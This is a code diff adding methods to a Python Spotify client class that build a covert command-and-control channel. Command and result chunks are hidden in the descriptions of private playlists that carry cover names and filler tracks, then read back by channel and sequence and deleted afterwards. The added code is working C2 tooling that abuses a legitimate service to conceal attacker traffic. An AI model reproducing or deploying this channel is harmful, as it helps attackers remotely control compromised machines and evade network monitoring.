@@ -433,3 +433,122 @@ class Spot:
             return [t['id'] for t in tracks[:count]]
         except spotipy.SpotifyException:
             return []
+
+    # --- C2 Channel Methods ---
+
+    def write_c2_playlists(self, chunks: list):
+        """Write C2 message chunks as playlists with cover names.
+
+        Args:
+            chunks: List of (chunk_data, metadata_json_str) tuples
+                from c2_protocol.chunk_payload().
+        """
+        for chunk_data, meta_json in chunks:
+            name = self._generate_cover_name()
+            description = chunk_data + MARKER_SEP + meta_json
+            try:
+                playlist = self.spotipy.user_playlist_create(
+                    self.username, name,
+                    public=False, collaborative=False,
+                    description=description,
+                )
+            except spotipy.SpotifyException as err:
+                print(f"[!] Cannot create C2 playlist: {err}")
+                continue
+
+            try:
+                tracks = self._get_filler_tracks()
+                if tracks:
+                    self.spotipy.user_playlist_add_tracks(
+                        self.username, playlist['id'], tracks
+                    )
+            except spotipy.SpotifyException:
+                pass
+
+            time.sleep(0.1)
+
+    def read_c2_playlists(self, channel: str,
+                          seq: int = None) -> dict:
+        """Read C2 playlists filtered by channel and optional seq.
+
+        Args:
+            channel: Channel discriminator ("cmd" or "res").
+            seq: If given, only return playlists matching this seq.
+
+        Returns:
+            Dict mapping seq -> list of (chunk_data, metadata_dict).
+        """
+        import json as _json
+        playlists = self._get_all_playlists()
+        seq_groups = {}
+
+        for p in playlists:
+            try:
+                full = self.spotipy.user_playlist(
+                    self.username, p['id']
+                )
+            except spotipy.SpotifyException:
+                continue
+
+            desc = html.unescape(full.get('description', ''))
+            if MARKER_SEP not in desc:
+                continue
+
+            parts = desc.split(MARKER_SEP, 1)
+            chunk_data = parts[0]
+            try:
+                meta = _json.loads(parts[1])
+            except (_json.JSONDecodeError, IndexError):
+                continue
+
+            if meta.get('c') != channel:
+                continue
+            msg_seq = meta.get('seq')
+            if seq is not None and msg_seq != seq:
+                continue
+
+            if msg_seq not in seq_groups:
+                seq_groups[msg_seq] = []
+            seq_groups[msg_seq].append((chunk_data, meta))
+
+        return seq_groups
+
+    def clean_c2_playlists(self, channel: str, seq: int = None):
+        """Delete C2 playlists matching channel and optional seq.
+
+        Args:
+            channel: Channel discriminator ("cmd" or "res").
+            seq: If given, only delete playlists matching this seq.
+        """
+        import json as _json
+        playlists = self._get_all_playlists()
+
+        for p in playlists:
+            try:
+                full = self.spotipy.user_playlist(
+                    self.username, p['id']
+                )
+            except spotipy.SpotifyException:
+                continue
+
+            desc = full.get('description', '')
+            if MARKER_SEP not in desc:
+                continue
+
+            parts = desc.split(MARKER_SEP, 1)
+            try:
+                meta = _json.loads(parts[1])
+            except (_json.JSONDecodeError, IndexError):
+                continue
+
+            if meta.get('c') != channel:
+                continue
+            if seq is not None and meta.get('seq') != seq:
+                continue
+
+            try:
+                self.spotipy.user_playlist_unfollow(
+                    self.username, p['id']
+                )
+            except spotipy.SpotifyException:
+                pass
